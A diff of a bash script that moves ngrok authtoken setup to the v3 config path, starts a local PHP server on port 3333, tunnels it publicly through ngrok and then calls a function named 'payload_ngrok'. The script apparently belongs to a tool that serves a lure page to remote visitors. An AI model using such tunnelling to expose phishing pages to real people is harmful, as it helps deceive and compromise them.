@@ -378,84 +378,57 @@ fi
 fi
 
 # ================================
-# NGROK AUTH TOKEN HANDLING (FIXED)
+# NGROK AUTH TOKEN HANDLING (LINUX v3 FIXED FOR CHROMEBOOK)
 # ================================
 
-ngrok_config_linux="$HOME/.ngrok2/ngrok.yml"
-ngrok_config_windows="$USERPROFILE\\.ngrok2\\ngrok.yml"
+ngrok_config="$HOME/.config/ngrok/ngrok.yml"
 
-set_ngrok_token_windows() {
-    # Check if config file exists
-    if [[ -f "$ngrok_config_windows" && $(grep -c "authtoken:" "$ngrok_config_windows") -gt 0 ]]; then
-        echo -e "\e[1;92m[*] Ngrok authtoken already exists. Skipping...\e[0m"
-    else
-        read -p $'\e[1;92m[+] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
-        ./ngrok.exe authtoken "$ngrok_auth" > /dev/null 2>&1 &
-        echo -e "\e[1;92m[*] Ngrok authtoken saved.\e[0m"
-    fi
-}
+# Create config directory if missing
+mkdir -p "$HOME/.config/ngrok"
 
-set_ngrok_token_linux() {
-    # Check if config file exists and contains authtoken
-    if [[ -f "$ngrok_config_linux" && $(grep -c "authtoken:" "$ngrok_config_linux") -gt 0 ]]; then
-        echo -e "\e[1;92m[*] Ngrok authtoken already exists. Skipping...\e[0m"
-    else
-        read -p $'\e[1;92m[+] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
-
-        mkdir -p "$HOME/.ngrok2"
-        echo "authtoken: $ngrok_auth" > "$ngrok_config_linux"
-
-        echo -e "\e[1;92m[*] Ngrok authtoken saved.\e[0m"
-    fi
-}
-
-# ================================
-# WINDOWS MODE
-# ================================
-if [[ "$windows_mode" == true ]]; then
-
-    set_ngrok_token_windows
-
-    echo -e "\e[1;92m[*] Starting PHP server...\e[0m"
-    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
-    sleep 2
-
-    echo -e "\e[1;92m[*] Starting Ngrok...\e[0m"
-    ./ngrok.exe http 3333 > /dev/null 2>&1 &
-
+# Check if ngrok token already exists
+if [[ -f "$ngrok_config" && $(grep -c "authtoken:" "$ngrok_config") -gt 0 ]]; then
+    echo -e "\e[1;92m[*] Ngrok authtoken already exists. Skipping token prompt.\e[0m"
 else
-# ================================
-# LINUX MODE
-# ================================
+    echo -e "\e[1;93m[!] No ngrok authtoken found.\e[0m"
+    read -p $'\e[1;92m[+] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
 
-    set_ngrok_token_linux
+    # Use ngrok v3 method
+    ngrok config add-authtoken "$ngrok_auth" > /dev/null 2>&1
 
-    echo -e "\e[1;92m[*] Starting PHP server...\e[0m"
-    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
-    sleep 2
-
-    echo -e "\e[1;92m[*] Starting Ngrok...\e[0m"
-    ./ngrok http 3333 > /dev/null 2>&1 &
-
+    echo -e "\e[1;92m[*] Ngrok authtoken saved to ~/.config/ngrok/ngrok.yml\e[0m"
 fi
 
-# ================================
-# WAIT FOR TUNNEL
-# ================================
-sleep 10
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
+# ================================
+# START THE SERVERS
+# ================================
+
+echo -e "\e[1;92m[*] Starting local PHP server...\e[0m"
+php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+sleep 2
+
+echo -e "\e[1;92m[*] Starting ngrok tunnel...\e[0m"
+ngrok http 3333 > /dev/null 2>&1 &
+sleep 4
+
+
+# ================================
+# GET NGROK PUBLIC URL
+# ================================
+
+link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
 
 if [[ -z "$link" ]]; then
-    echo -e "\e[1;31m[!] Direct link is not generating.\e[0m"
+    echo -e "\e[1;31m[!] Failed to generate ngrok link.\e[0m"
     echo -e "\e[1;93m[*] Possible issues:\e[0m"
-    echo -e "  - Invalid ngrok authtoken"
-    echo -e "  - Internet connection problems"
-    echo -e "  - Ngrok already running (run: killall ngrok)"
-    echo -e "  - Try manually: ./ngrok http 3333"
+    echo -e "  - Invalid authtoken"
+    echo -e "  - Slow internet"
+    echo -e "  - ngrok already running (fix: killall ngrok)"
+    echo -e "  - Try manually: ngrok http 3333"
     exit 1
 else
-    printf "\e[1;92m[*] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
+    echo -e "\e[1;92m[*] Direct link:\e[0m $link"
 fi
 
 payload_ngrok
